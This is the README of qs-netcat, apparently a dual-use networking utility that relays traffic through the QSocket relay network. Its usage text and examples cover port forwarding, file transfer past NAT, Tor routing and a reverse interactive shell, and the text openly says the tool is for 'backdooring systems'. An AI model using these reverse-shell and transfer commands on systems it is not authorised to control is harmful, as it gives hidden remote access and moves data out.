# qs-netcat

<p align="center">
  <img src="https://github.com/qsocket/qs-netcat/raw/master/.github/img/banner.png">
  <br/><br/>
  <a href="https://github.com/qsocket/qs-netcat">
    <img src="https://img.shields.io/github/v/release/qsocket/qs-netcat?style=flat-square">
  </a>
  <a href="https://github.com/qsocket/qs-netcat">
    <img src="https://img.shields.io/github/go-mod/go-version/qsocket/qs-netcat?style=flat-square">
  </a>
  <a href="https://goreportcard.com/report/github.com/qsocket/qs-netcat">
    <img src="https://goreportcard.com/badge/github.com/qsocket/qs-netcat?style=flat-square">
  </a>
  <a href="https://github.com/qsocket/qs-netcat/issues">
    <img src="https://img.shields.io/github/issues/qsocket/qs-netcat?style=flat-square&color=red">
  </a>
  <a href="https://raw.githubusercontent.com/qsocket/qs-netcat/master/LICENSE">
    <img src="https://img.shields.io/github/license/qsocket/qs-netcat.svg?style=flat-square">
  </a>
</p>

qs-netcat is a cross-platform networking utility which reads and writes data across systems using the [QSRN](https://github.com/qsocket/qsrn). 
It allows redirecting true PTY session with reverse connections effectively backdooring systems, creating TCP proxies, and transfering files to/from systems under NAT networks.



```
qs-netcat [-liC] [-e cmd] [-p port]
Version: v1.0.1660145903-1696aab
	-s <secret>  Secret. (e.g. password).
	-l           Listening server. [default: client]
	-g           Generate a Secret. (random)
	-C           Disable encryption.
	-t           Probe interval for QSRN. (5s)
	-T           Use TOR.
	-f <IP>      IPv4 address for port forwarding.
	-p <port>    Port to listen on or forward to.
	-i           Interactive login shell. (TTY) [Ctrl-e q to terminate]
	-e <cmd>     Execute command. [e.g. "bash -il" or "cmd.exe"]
	-pin         Enable certificate fingerprint verification on TLS connections.
	-v           Verbose output.
	-q           Quiet. No log output.

Example to forward traffic from port 2222 to 192.168.6.7:22:
  $ qs-netcat -s MyCecret -l -f 192.168.6.7 -p 22     # Server
  $ qs-netcat -s MyCecret -p 2222                     # Client
Example file transfer:
  $ qs-netcat -q -l -s MyCecret >warez.tar.gz         # Server
  $ qs-netcat -q -s MyCecret <warez.tar.gz            # Client
Example for a reverse shell:
  $ qs-netcat -s MyCecret -l -i                       # Server
  $ qs-netcat -s MyCecret -i                          # Client

```
